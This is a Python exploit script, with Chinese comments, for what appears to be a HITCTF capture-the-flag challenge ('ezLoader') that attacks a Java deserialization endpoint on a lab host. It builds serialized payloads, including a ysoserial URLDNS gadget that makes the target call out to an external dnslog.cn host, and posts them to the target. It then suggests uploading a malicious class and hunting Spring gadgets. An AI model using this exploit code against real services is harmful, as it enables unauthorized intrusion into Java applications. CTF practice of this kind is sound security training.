#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HITCTF ezLoader - 自定义 Payload 生成器
使用原生 Java 类构造反序列化利用链
"""

import base64
import requests

TARGET_URL = "http://5bd9497ae8ad.target.yijinglab.com/unser"

def test_basic_deserialization():
    """
    测试 1: 最基础的反序列化测试
    使用 java.util.HashMap
    """
    print("[Test 1] 测试基础反序列化 (HashMap)...")
    
    # 生成一个简单的 HashMap 序列化数据
    import subprocess
    
    # 创建临时 Java 文件
    java_code = """
import java.io.*;
import java.util.*;

public class GenPayload {
    public static void main(String[] args) throws Exception {
        HashMap<String, String> map = new HashMap<>();
        map.put("test", "value");
        
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(map);
        oos.close();
        
        System.out.write(bos.toByteArray());
    }
}
"""
    
    with open("GenPayload.java", "w") as f:
        f.write(java_code)
    
    # 编译并执行
    subprocess.run(["javac", "GenPayload.java"], check=True)
    result = subprocess.run(["java", "GenPayload"], capture_output=True)
    
    payload_b64 = base64.b64encode(result.stdout).decode()
    
    response = requests.post(TARGET_URL, data={"data": payload_b64}, timeout=10)
    print(f"    状态码: {response.status_code}")
    print(f"    响应: {response.text[:200]}")
    
    # 清理
    import os
    os.remove("GenPayload.java")
    os.remove("GenPayload.class")
    
    return response.status_code == 200


def exploit_with_jdk_native():
    """
    尝试使用 JDK 原生类构造 RCE
    """
    print("\n[Exploit] 尝试 JDK 原生利用链...")
    
    # 尝试 URLDNS
    print("  [1] URLDNS 测试 (DNS 外带)...")
    
    import subprocess
    
    java_opts = [
        "--add-opens=java.base/java.net=ALL-UNNAMED",
        "--add-opens=java.base/java.util=ALL-UNNAMED"
    ]
    
    # 替换为你的 dnslog
    dnslog = "test.dnslog.cn"
    
    result = subprocess.run(
        ["java"] + java_opts + ["-jar", "ysoserial.jar", "URLDNS", f"http://{dnslog}"],
        capture_output=True
    )
    
    if result.returncode == 0:
        payload_b64 = base64.b64encode(result.stdout).decode()
        response = requests.post(TARGET_URL, data={"data": payload_b64}, timeout=10)
        print(f"    状态码: {response.status_code}")
        print(f"    [!] 请在 dnslog.cn 查看是否有 DNS 记录")


def main():
    print("=" * 60)
    print("  HITCTF ezLoader - 调试与利用")
    print("=" * 60)
    print()
    
    print("⚠️  已知信息:")
    print("  - 服务器缺少 commons-collections 依赖")
    print("  - 黑名单过滤了 5 个类")
    print("  - 使用自定义 SecureObjectInputStream")
    print()
    
    try:
        # test_basic_deserialization()
        exploit_with_jdk_native()
    except Exception as e:
        print(f"[!] 错误: {e}")
    
    print("\n" + "=" * 60)
    print("💡 下一步建议:")
    print("  1. 检查原始 jar 包是否有更多依赖")
    print("  2. 尝试上传恶意类文件 (题目叫 ezLoader)")
    print("  3. 寻找 Spring 框架本身的 gadget")
    print("=" * 60)


if __name__ == "__main__":
    main()
